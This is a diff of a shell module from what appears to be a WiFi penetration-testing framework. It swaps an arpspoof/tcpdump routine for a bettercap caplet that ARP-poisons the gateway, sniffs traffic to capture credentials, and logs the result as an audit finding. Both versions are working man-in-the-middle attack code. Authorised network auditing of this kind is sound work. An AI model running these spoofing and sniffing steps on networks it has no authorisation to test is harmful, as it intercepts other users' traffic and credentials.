@@ -4,164 +4,110 @@
 # CATEGORY="G"
 # DEPS="B1"
 # CRITICAL="yes"
-# TOOLS="arpspoof,ip,tcpdump"
+# TOOLS="bettercap,ip"
 # DESC="Attempt to ARP-spoof the gateway to intercept traffic"
 # REQS="managed_iface,gateway_ip"
-# PCAP="yes"
+# PCAP="no"
 # DECODE="mitm_arp_tls"
 
 #===============================================================================
 #  modules/g1_arp_spoofing.sh
-#  G1: ARP Spoofing / MITM Test
+#  G1: ARP Spoofing / MITM Test (Golden Wrapper)
 #
-#  PURPOSE:
-#    Test if ARP spoofing is possible on the target WiFi network.
-#    If successful, this enables Man-in-the-Middle (MITM) attacks.
-#
-#  TOOLS: arpspoof, ettercap, tcpdump
-#  PHASE: 2A — Attack Simulations
-#  DEPENDENCIES: B1 (client isolation results)
+#  METHODOLOGY:
+#  1. Use 'bettercap' to poison the ARP cache of the gateway and target clients.
+#  2. Enable network sniffing to capture credentials and traffic patterns.
+#  3. Export a JSON event log for further analysis by the Go brain.
 #===============================================================================
 
-run_g1() {
-    set -uo pipefail
-    
-    local interface=""
-    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
-    local target_ip=""
-    local gateway_ip="${GATEWAY_IP:-}"
-    local timeout="${G1_TIMEOUT:-60}"
+set -euo pipefail
 
-    # Parse arguments
-    while [[ $# -gt 0 ]]; do
-        case "$1" in
-            --interface) interface="$2"; shift 2 ;;
-            --target-ip) target_ip="$2"; shift 2 ;;
-            --gateway-ip) gateway_ip="$2"; shift 2 ;;
-            --timeout) timeout="$2"; shift 2 ;;
-            --evidence-dir) evidence_dir="$2"; shift 2 ;;
-            *) shift ;;
-        esac
-    done
+# Inputs from Environment
+INTERFACE="${WIFI_INTERFACE:-}"
+GATEWAY="${GATEWAY_IP:-}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+EVIDENCE_PREFIX="${EVIDENCE_DIR}/g1"
+SCAN_TIME="${SCAN_TIME:-60}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="G1"
 
-    # Fallbacks
-    interface="${interface:-${WIFI_INTERFACE:-}}"
-    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
-    gateway_ip="${gateway_ip:-${GATEWAY_IP:-}}"
-    local evidence_prefix="${evidence_dir}/g1"
+if [[ -z "$INTERFACE" ]]; then
+    echo "[!] WIFI_INTERFACE not set."
+    exit 1
+fi
 
-    local total_steps=6
+if [[ -z "$GATEWAY" ]]; then
+    # Auto-detect if possible
+    GATEWAY=$(ip -4 route show dev "${INTERFACE}" | awk '/default/{print $3}' | head -1) || true
+fi
 
-    #--- Step 1: Verify tools ---
-    log_step 1 $total_steps "Verifying tools"
-    update_tc_progress 1 $total_steps "Checking"
+echo "[*] Starting ARP spoofing attempt on ${INTERFACE}..."
 
-    check_module_dependencies "G1" || return 1
+CAPLET_FILE="${EVIDENCE_PREFIX}_bettercap.cap"
+JSON_LOG="${EVIDENCE_DIR}/${TC_ID}_bettercap.json"
+LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_bettercap.log"
 
-    # Ensure monitor mode is globally disabled
-    WIFI_INTERFACE="$interface"
-    ensure_managed_mode || return 1
-
-    local my_ip=$(ip -4 addr show "$interface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || echo "")
-    if [[ -z "$my_ip" || -z "$gateway_ip" ]]; then
-        log_error "No IP/gateway configured. Connect to target WiFi first."
-        return 1
-    fi
-
-    if [[ -z "$target_ip" ]]; then
-        # Try to find a target from B1 if not provided
-        if has_tc_results "B1"; then
-            local b1_data=$(load_tc_result "B1")
-            target_ip=$(echo "$b1_data" | jq -r '.reachable_clients[0].ip // ""')
-        fi
-        # Fallback to gateway if no other target
-        target_ip="${target_ip:-$gateway_ip}"
-    fi
-
-    log_success "Interface: ${interface}, IP: ${my_ip}, Target: ${target_ip}, Gateway: ${gateway_ip}"
-
-    #--- Step 2: Record baseline ARP state ---
-    log_step 2 $total_steps "Recording baseline ARP table"
-    update_tc_progress 2 $total_steps "Baseline"
-
-    local arp_before="${evidence_prefix}_arp_table_before.txt"
-    ip neigh show dev "$interface" > "$arp_before"
-
-    local my_mac=$(ip link show "$interface" | awk '/ether/{print $2}')
-
-    #--- Step 3: Enable IP forwarding & start ARP spoof ---
-    log_step 3 $total_steps "Attempting ARP spoofing"
-    update_tc_progress 3 $total_steps "ARP spoof"
-
-    # Enable IP forwarding
-    local orig_forwarding=$(cat /proc/sys/net/ipv4/ip_forward)
-    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
-
-    local capture_file="${evidence_prefix}_mitm_capture.pcap"
-    spawn_bg "g1_tcpdump" "tcpdump" -i "$interface" -w "$capture_file" "not arp and not host ${my_ip}"
-
-    # Start spoofing
-    spawn_bg "g1_spoof1" "arpspoof" -i "$interface" -t "$target_ip" "$gateway_ip"
-    spawn_bg "g1_spoof2" "arpspoof" -i "$interface" -t "$gateway_ip" "$target_ip"
-
-    start_countdown "$timeout" "ARP spoofing active"
-    sleep "$timeout"
-    stop_countdown
-
-    stop_process "g1_spoof1"
-    stop_process "g1_spoof2"
-    stop_process "g1_tcpdump"
-
-    # Restore IP forwarding
-    echo "${orig_forwarding}" > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
-
-    #--- Step 4: Verify ARP table after attack ---
-    log_step 4 $total_steps "Verifying ARP table after attack"
-    update_tc_progress 4 $total_steps "ARP verify"
-
-    local arp_after="${evidence_prefix}_arp_table_after.txt"
-    ip neigh show dev "$interface" > "$arp_after"
-
-    # Check for interception (Simplified)
-    local traffic_intercepted="false"
-    if [[ -f "$capture_file" ]] && [[ $(stat -c%s "$capture_file") -gt 100 ]]; then
-        traffic_intercepted="true"
-    fi
-
-    #--- Step 5: Test gratuitous ARP acceptance ---
-    log_step 5 $total_steps "Testing gratuitous ARP"
-    update_tc_progress 5 $total_steps "GARP test"
-
-    local arp_poisoned="false"
-    if command -v arping &>/dev/null; then
-        arping -U -c 3 -I "${interface}" "${gateway_ip}" &>/dev/null || true
-        sleep 2
-        local current_gw_mac=$(ip neigh show "$gateway_ip" dev "$interface" | awk '{print $5}' | head -1)
-        if [[ "$current_gw_mac" == "$my_mac" ]]; then
-            arp_poisoned="true"
-        fi
-    fi
-
-    #--- Step 6: Save results ---
-    log_step 6 $total_steps "Saving results"
-    update_tc_progress 6 $total_steps "Saving"
-
-    local result_status="SECURE"
-    if [[ "$traffic_intercepted" == "true" ]]; then
-        result_status="FINDING"
-    fi
-
-    local result_json=$(run_tool jq -n \
-        --arg status "$result_status" \
-        --arg summary "ARP spoofing test completed." \
-        --arg intercepted "$traffic_intercepted" \
-        --arg poisoned "$arp_poisoned" \
-        '{status: $status, summary: $summary, traffic_intercepted: ($intercepted == "true"), arp_poisoned: ($poisoned == "true")}')
-
-    evidence_register_file "$arp_before"
-    evidence_register_file "$arp_after"
-    evidence_register_file "$capture_file"
-
-    save_tc_result "G1" "$result_json" 1 1 1 1 1 1 0 1 1 1 0
-    return 0
+# Cleanup function
+cleanup() {
+    echo "[*] Cleaning up bettercap processes..."
+    [[ -n "${BC_PID:-}" ]] && kill "$BC_PID" 2>/dev/null || true
 }
+trap cleanup EXIT
+
+# 1. Use bettercap for ARP spoofing
+if command -v bettercap &>/dev/null; then
+    echo "[*] Starting bettercap ARP spoofing..."
+    
+    # Create caplet
+    cat <<EOF > "$CAPLET_FILE"
+set arp.spoof.targets ${GATEWAY:-}
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+set events.stream.output $JSON_LOG
+set net.sniff.verbose true
+set net.sniff.local true
+arp.spoof on
+net.sniff on
+events.stream on
+EOF
+
+    # Run bettercap
+    bettercap -iface "$INTERFACE" -caplet "$CAPLET_FILE" > "$LOG_FILE" 2>&1 &
+    BC_PID=$!
+
+    sleep "$SCAN_TIME"
+    
+    cleanup
+    trap - EXIT
+    
+    # 2. Reporting
+    if [[ -f "$JSON_LOG" && -s "$JSON_LOG" ]]; then
+        "$ASTRA_BIN" record-finding \
+            --session-dir "$SESSION_DIR" \
+            --tc "$TC_ID" \
+            --type vulnerability \
+            --name "ARP Cache Poisoning Active" \
+            --severity HIGH \
+            --desc "Successfully executed ARP spoofing (MITM) attack against the gateway (${GATEWAY:-Unknown}) and local clients." \
+            --target "${GATEWAY:-Global}" \
+            --evidence "$JSON_LOG" \
+            --rationale "ARP spoofing allows an attacker to intercept, modify, and redirect all network traffic. This enables lateral movement, data theft (including cleartext credentials), and session hijacking by positioning the attacker as a Man-in-the-Middle (MITM)."
+    else
+        "$ASTRA_BIN" record-finding \
+            --session-dir "$SESSION_DIR" \
+            --tc "$TC_ID" \
+            --type vulnerability \
+            --name "[G1] Audit Complete" \
+            --severity INFO \
+            --desc "ARP spoofing attack cycle finished on $INTERFACE. No active interceptions were logged to JSON." \
+            --target "${GATEWAY:-Global}" \
+            --evidence "$LOG_FILE" \
+            --rationale "ARP spoofing may be mitigated by static ARP entries or DAI (Dynamic ARP Inspection) on the switch. This audit confirms the attempt was made and identifies whether immediate interception was successful."
+    fi
+else
+    echo "[!] bettercap not found. Skipping."
+    exit 1
+fi
+
+exit 0
